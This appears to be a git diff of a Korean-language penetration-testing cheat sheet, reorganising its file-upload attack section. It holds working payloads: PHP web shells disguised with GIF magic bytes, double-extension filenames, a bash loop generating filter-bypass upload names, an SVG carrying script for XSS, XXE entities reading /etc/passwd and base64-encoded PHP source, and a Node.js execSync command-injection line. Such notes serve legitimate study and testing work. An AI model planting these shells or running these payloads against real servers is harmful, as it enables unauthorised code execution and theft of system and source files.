@@ -622,24 +622,57 @@ process.mainModule.require('child_process').execSync('ls -la')
 - 비동기 함수(`exec`, `spawn` 등)는 결과를 즉시 반환하지 않아 공격에 부적합
 
 ---
+
 # File Upload
+## 클라이언트 사이드 검증 우회
 - front에서 파일타입만 확인하는 경우 파일 이름과 내용을 바꿔서 서버로 전송(image.jpg -> ex.php)
 - html 수정
+
 <img width="1942" height="455" alt="image" src="https://github.com/user-attachments/assets/5be7d857-603b-4260-9a90-facf245bde4f" />
-- `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt`
-- `shell.jpg.php`
-- `shell.php.jpg`
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
-- `/usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt`
+
+---
+## 확장자 우회 기법
+
+### 유용한 Wordlist
+```bash
+# 다양한 웹 확장자 리스트
+/usr/share/seclists/Discovery/Web-Content/web-extensions.txt
+
+# PayloadsAllTheThings PHP 확장자 리스트
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
+
+# Content-Type 리스트
+/usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
+```
+
+### 확장자 변조 예시
+```bash
+shell.jpg.php     # 이중 확장자
+shell.php.jpg     # 역순 이중 확장자
+```
+
+---
+
+## 매직 바이트를 이용한 우회
+
+### GIF 매직 바이트
 ```php
 GIF89a;
 <?php system($_REQUEST['cmd']); ?>
 ```
+
 ```php
 GIF87a;
 <?php system($_REQUEST['cmd']); ?>
 ```
+
+---
+
+## 파일명 조작을 통한 우회
+
+### 특수 문자 삽입 스크립트
 ```bash
+# 다양한 특수 문자를 조합하여 필터 우회 시도
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
     for ext in '.php' '.phps'; do
         echo "shell$char$ext.jpg" >> wordlist.txt
@@ -649,6 +682,12 @@ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
     done
 done
 ```
+
+---
+
+## SVG 파일을 이용한 공격
+
+### XSS가 포함된 SVG
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -657,11 +696,19 @@ done
     <script type="text/javascript">alert(window.origin);</script>
 </svg>
 ```
+
+---
+
+## XXE (XML External Entity) 공격
+
+### /etc/passwd 읽기
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg>&xxe;</svg>
 ```
+
+### PHP 소스 코드 읽기 (Base64 인코딩)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
